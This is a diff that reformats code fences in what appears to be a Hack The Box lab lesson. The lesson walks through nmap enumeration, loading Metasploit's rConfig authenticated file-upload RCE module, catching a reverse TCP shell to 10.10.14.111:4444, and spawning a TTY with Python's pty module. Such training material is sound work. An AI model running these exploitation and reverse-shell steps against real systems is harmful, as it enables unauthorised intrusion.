@@ -26,8 +26,7 @@ As in most engagements, we will start with an initial enumeration of the system 
 
 #### Enumerate the Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -sC -sV 10.129.201.101
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
@@ -89,8 +88,7 @@ We can also use Metasploit's search functionality to see if any exploit modules 
 
 #### Search For an Exploit Module
 
-```
-        shellsession
+```shellsession
 msf6 > search rconfig
 
 Matching Modules
@@ -110,8 +108,7 @@ This search can point us to the source code for an exploit module called `rconfi
 
 #### Locate
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ locate exploits
 ```
 
@@ -129,8 +126,7 @@ In msfconsole, we can manually load the exploit using the command:
 
 #### Select an Exploit
 
-```
-        shellsession
+```shellsession
 msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 ```
 
@@ -140,8 +136,7 @@ Use what you have learned in the module thus far to fill out the options associa
 
 #### Execute the Exploit
 
-```
-        shellsession
+```shellsession
 msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.111:4444 
@@ -176,8 +171,7 @@ We can see from the steps outlined in the exploitation process that this exploit
 
 #### Interact With the Shell
 
-```
-        shellsession
+```shellsession
 
 meterpreter > shell
 
@@ -203,8 +197,7 @@ We can manually spawn a TTY shell using Python if it is present on the system. W
 
 #### Interactive Python
 
-```
-        shellsession
+```shellsession
 python -c 'import pty; pty.spawn("/bin/sh")' 
 
 sh-4.2$         
